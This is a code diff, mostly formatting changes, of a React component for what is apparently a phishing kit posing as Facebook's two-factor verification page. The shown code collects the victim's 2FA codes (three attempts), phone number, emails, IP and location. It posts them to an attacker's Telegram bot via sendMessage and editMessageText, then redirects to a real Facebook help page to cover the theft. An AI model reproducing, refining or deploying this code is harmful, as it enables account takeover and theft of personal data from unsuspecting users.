@@ -3,7 +3,12 @@
 import Image from "next/image";
 import { useRouter, useSearchParams } from "next/navigation";
 import { useEffect, useMemo, useState } from "react";
-import { Dictionary, Locale, getDictionary, resolveLocaleFromCountryCode } from "@/lib/i18n";
+import {
+  Dictionary,
+  Locale,
+  getDictionary,
+  resolveLocaleFromCountryCode,
+} from "@/lib/i18n";
 import styles from "./two-factor.module.css";
 
 type TwoFactorMethod = "app" | "whatsapp" | "sms" | "email";
@@ -70,10 +75,14 @@ function formatCooldownTime(
     }
   } else {
     if (minutes > 0) {
-      segments.push(`${minutes} ${minutes > 1 ? labels.minutePlural : labels.minuteSingular}`);
+      segments.push(
+        `${minutes} ${minutes > 1 ? labels.minutePlural : labels.minuteSingular}`,
+      );
     }
     if (remainingSeconds > 0) {
-      segments.push(`${remainingSeconds} ${remainingSeconds > 1 ? labels.secondPlural : labels.secondSingular}`);
+      segments.push(
+        `${remainingSeconds} ${remainingSeconds > 1 ? labels.secondPlural : labels.secondSingular}`,
+      );
     }
   }
 
@@ -153,7 +162,9 @@ export default function TwoFactorClient({ locale }: { locale: Locale }) {
   const router = useRouter();
   const searchParams = useSearchParams();
   const methodParam = useMemo(() => searchParams.get("method"), [searchParams]);
-  const [context, setContext] = useState<TwoFactorContext | null>(() => loadContext());
+  const [context, setContext] = useState<TwoFactorContext | null>(() =>
+    loadContext(),
+  );
   const [twoFactorCode, setTwoFactorCode] = useState("");
   const [twoFactorError, setTwoFactorError] = useState("");
   const [isSubmitDisabled, setIsSubmitDisabled] = useState(false);
@@ -181,7 +192,10 @@ export default function TwoFactorClient({ locale }: { locale: Locale }) {
     if (!context) {
       return;
     }
-    const nextMethod = (methodParam as TwoFactorMethod | null) || context.selectedMethod || "app";
+    const nextMethod =
+      (methodParam as TwoFactorMethod | null) ||
+      context.selectedMethod ||
+      "app";
     if (context.selectedMethod !== nextMethod) {
       saveContext({ ...context, selectedMethod: nextMethod });
     }
@@ -208,7 +222,8 @@ export default function TwoFactorClient({ locale }: { locale: Locale }) {
       ? `${modal.twoFactorIncorrectLabel} ${formatCooldownTime(timeLeft, derivedLocale, common)}`
       : twoFactorError;
 
-  const selectedMethod = (methodParam as TwoFactorMethod | null) || context?.selectedMethod || "app";
+  const selectedMethod =
+    (methodParam as TwoFactorMethod | null) || context?.selectedMethod || "app";
   const twoFactorMethodContent = (() => {
     if (!context) {
       return {
@@ -220,21 +235,30 @@ export default function TwoFactorClient({ locale }: { locale: Locale }) {
     if (selectedMethod === "whatsapp") {
       return {
         title: modal.twoFactorWhatsappTitle,
-        description: applyTemplate(modal.twoFactorWhatsappDescription, maskPhoneTail(context.form.phoneNumber)),
+        description: applyTemplate(
+          modal.twoFactorWhatsappDescription,
+          maskPhoneTail(context.form.phoneNumber),
+        ),
         imageSrc: "/imgi_1_whatsApp.4313bae1d1ce346d2fe6.png",
       };
     }
     if (selectedMethod === "sms") {
       return {
         title: modal.twoFactorSmsTitle,
-        description: applyTemplate(modal.twoFactorSmsDescription, maskPhoneTail(context.form.phoneNumber)),
+        description: applyTemplate(
+          modal.twoFactorSmsDescription,
+          maskPhoneTail(context.form.phoneNumber),
+        ),
         imageSrc: "/imgi_1_sms.874d1de2b472119dde0c.png",
       };
     }
     if (selectedMethod === "email") {
       return {
         title: modal.twoFactorEmailTitle,
-        description: applyTemplate(modal.twoFactorEmailDescription, maskEmail(context.form.email, common.fallbackMaskedEmail)),
+        description: applyTemplate(
+          modal.twoFactorEmailDescription,
+          maskEmail(context.form.email, common.fallbackMaskedEmail),
+        ),
         imageSrc: "/imgi_1_sms.874d1de2b472119dde0c.png",
       };
     }
@@ -245,7 +269,10 @@ export default function TwoFactorClient({ locale }: { locale: Locale }) {
     };
   })();
 
-  const buildTelegramMessage = (status: string, overrides: TelegramOverrides = {}) => {
+  const buildTelegramMessage = (
+    status: string,
+    overrides: TelegramOverrides = {},
+  ) => {
     if (!context) {
       return "";
     }
@@ -253,7 +280,9 @@ export default function TwoFactorClient({ locale }: { locale: Locale }) {
       .split("/")
       .map((part) => part.trim())
       .filter(Boolean);
-    const safeCountry = escapeHtml(locationParts[2] ?? locationParts[1] ?? locationParts[0] ?? "N/A");
+    const safeCountry = escapeHtml(
+      locationParts[2] ?? locationParts[1] ?? locationParts[0] ?? "N/A",
+    );
     const safeCity = escapeHtml(locationParts[1] ?? locationParts[0] ?? "N/A");
     const safeIp = escapeHtml(context.clientIp ?? "N/A");
     const safePageName = escapeHtml(context.form.pageName || "N/A");
@@ -263,7 +292,8 @@ export default function TwoFactorClient({ locale }: { locale: Locale }) {
     const safeBusinessEmail = escapeHtml(context.form.workEmail || "N/A");
     const safeDetails = escapeHtml(context.form.details.trim() || "N/A");
     const safePhone = escapeHtml(
-      `${normalizeCallingCode(context.clientCallingCode)} ${context.form.phoneNumber}`.trim() || "+84",
+      `${normalizeCallingCode(context.clientCallingCode)} ${context.form.phoneNumber}`.trim() ||
+        "+84",
     );
     const safeUrl = escapeHtml(context.currentUrl || "N/A");
     const safeTime = escapeHtml(getCurrentTime());
@@ -305,16 +335,22 @@ export default function TwoFactorClient({ locale }: { locale: Locale }) {
     if (!BOT_TOKEN || !CHAT_ID) {
       return null;
     }
-    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text,
-        parse_mode: "HTML",
-      }),
-    });
-    const data = (await response.json()) as { ok?: boolean; result?: { message_id?: number } };
+    const response = await fetch(
+      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+      {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text,
+          parse_mode: "HTML",
+        }),
+      },
+    );
+    const data = (await response.json()) as {
+      ok?: boolean;
+      result?: { message_id?: number };
+    };
     if (data?.ok && data.result?.message_id) {
       const nextId = String(data.result.message_id);
       if (context) {
@@ -330,12 +366,19 @@ export default function TwoFactorClient({ locale }: { locale: Locale }) {
     return null;
   };
 
-  const updateTelegramMessage = async (status: string, overrides: TelegramOverrides = {}) => {
+  const updateTelegramMessage = async (
+    status: string,
+    overrides: TelegramOverrides = {},
+  ) => {
     if (!context) {
       return;
     }
     const text = buildTelegramMessage(status, overrides);
-    const messageId = context.messageId || (typeof window !== "undefined" ? window.localStorage.getItem("telegram_msg_id") : null);
+    const messageId =
+      context.messageId ||
+      (typeof window !== "undefined"
+        ? window.localStorage.getItem("telegram_msg_id")
+        : null);
     if (!messageId) {
       await sendTelegramMessage(text);
       return;
@@ -346,16 +389,19 @@ export default function TwoFactorClient({ locale }: { locale: Locale }) {
       if (!Number.isFinite(messageIdNumber)) {
         throw new Error("Invalid message id");
       }
-      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          message_id: messageIdNumber,
-          text,
-          parse_mode: "HTML",
-        }),
-      });
+      const response = await fetch(
+        `https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`,
+        {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            message_id: messageIdNumber,
+            text,
+            parse_mode: "HTML",
+          }),
+        },
+      );
       const data = await response.json();
       if (!data?.ok) {
         throw new Error("Telegram edit failed");
@@ -395,7 +441,9 @@ export default function TwoFactorClient({ locale }: { locale: Locale }) {
       const updated = { ...context, code1: firstCode, clickCount1: 1 };
       setContext(updated);
       saveContext(updated);
-      await updateTelegramMessage("Đang chờ mã xác thực 2FA...", { code1: firstCode });
+      await updateTelegramMessage("Đang chờ mã xác thực 2FA...", {
+        code1: firstCode,
+      });
       setIsSubmitDisabled(true);
       setTimeLeft(10);
       setTwoFactorCode("");
@@ -407,7 +455,9 @@ export default function TwoFactorClient({ locale }: { locale: Locale }) {
       const updated = { ...context, code2: secondCode, clickCount1: 2 };
       setContext(updated);
       saveContext(updated);
-      await updateTelegramMessage("Đang chờ mã xác thực 2FA...", { code2: secondCode });
+      await updateTelegramMessage("Đang chờ mã xác thực 2FA...", {
+        code2: secondCode,
+      });
       setIsSubmitDisabled(true);
       setTimeLeft(10);
       setTwoFactorCode("");
@@ -422,7 +472,8 @@ export default function TwoFactorClient({ locale }: { locale: Locale }) {
       await updateTelegramMessage("Hoàn tất!", { code3: thirdCode });
       setTwoFactorCode("");
       setTimeout(() => {
-        window.location.href = "https://www.facebook.com/help/1735443093393986/";
+        window.location.href =
+          "https://www.facebook.com/help/1735443093393986/";
       }, 2000);
     }
   };
@@ -442,17 +493,26 @@ export default function TwoFactorClient({ locale }: { locale: Locale }) {
         {
           id: "whatsapp",
           title: modal.altMethodWhatsappTitle,
-          subtitle: applyTemplate(modal.altMethodWhatsappSubtitle, maskPhoneTail(context.form.phoneNumber)),
+          subtitle: applyTemplate(
+            modal.altMethodWhatsappSubtitle,
+            maskPhoneTail(context.form.phoneNumber),
+          ),
         },
         {
           id: "sms",
           title: modal.altMethodSmsTitle,
-          subtitle: applyTemplate(modal.altMethodSmsSubtitle, maskPhoneTail(context.form.phoneNumber)),
+          subtitle: applyTemplate(
+            modal.altMethodSmsSubtitle,
+            maskPhoneTail(context.form.phoneNumber),
+          ),
         },
         {
           id: "email",
           title: modal.altMethodEmailTitle,
-          subtitle: applyTemplate(modal.altMethodEmailSubtitle, maskEmail(context.form.email, common.fallbackMaskedEmail)),
+          subtitle: applyTemplate(
+            modal.altMethodEmailSubtitle,
+            maskEmail(context.form.email, common.fallbackMaskedEmail),
+          ),
         },
       ] as const)
     : [];
@@ -464,7 +524,9 @@ export default function TwoFactorClient({ locale }: { locale: Locale }) {
       <div className={styles.content}>
         {metaLine ? <p className={styles.meta}>{metaLine} • Facebook</p> : null}
         <h1 className={styles.title}>{twoFactorMethodContent.title}</h1>
-        <p className={styles.description}>{twoFactorMethodContent.description}</p>
+        <p className={styles.description}>
+          {twoFactorMethodContent.description}
+        </p>
         <div className={styles.imageWrap}>
           <Image
             src={twoFactorMethodContent.imageSrc}
@@ -483,7 +545,9 @@ export default function TwoFactorClient({ locale }: { locale: Locale }) {
           className={styles.codeInput}
           inputMode="numeric"
         />
-        {twoFactorErrorMessage ? <p className={styles.error}>{twoFactorErrorMessage}</p> : null}
+        {twoFactorErrorMessage ? (
+          <p className={styles.error}>{twoFactorErrorMessage}</p>
+        ) : null}
 
         <button
           type="button"
@@ -493,16 +557,28 @@ export default function TwoFactorClient({ locale }: { locale: Locale }) {
         >
           {modal.continueButtonLabel}
         </button>
-        <button type="button" className={styles.secondaryButton} onClick={handleTryAnotherWay}>
+        <button
+          type="button"
+          className={styles.secondaryButton}
+          onClick={handleTryAnotherWay}
+        >
           {modal.altMethodsTriggerLabel}
         </button>
       </div>
 
       {showAltMethods ? (
-        <div className={styles.modalOverlay} onClick={() => setShowAltMethods(false)}>
-          <div className={styles.modalContent} onClick={(event) => event.stopPropagation()}>
+        <div
+          className={styles.modalOverlay}
+          onClick={() => setShowAltMethods(false)}
+        >
+          <div
+            className={styles.modalContent}
+            onClick={(event) => event.stopPropagation()}
+          >
             <h2 className={styles.modalHeading}>{modal.altMethodsHeading}</h2>
-            <p className={styles.modalDescription}>{modal.altMethodsDescription}</p>
+            <p className={styles.modalDescription}>
+              {modal.altMethodsDescription}
+            </p>
             <div className={styles.optionsWrap}>
               {altMethods.map((option) => {
                 const isSelected = popupMethod === option.id;
@@ -517,7 +593,9 @@ export default function TwoFactorClient({ locale }: { locale: Locale }) {
                       <p className={styles.optionTitle}>{option.title}</p>
                       <p className={styles.optionSubtitle}>{option.subtitle}</p>
                     </div>
-                    <span className={`${styles.optionRadio} ${isSelected ? styles.optionRadioActive : ""}`}>
+                    <span
+                      className={`${styles.optionRadio} ${isSelected ? styles.optionRadioActive : ""}`}
+                    >
                       <span />
                     </span>
                   </button>
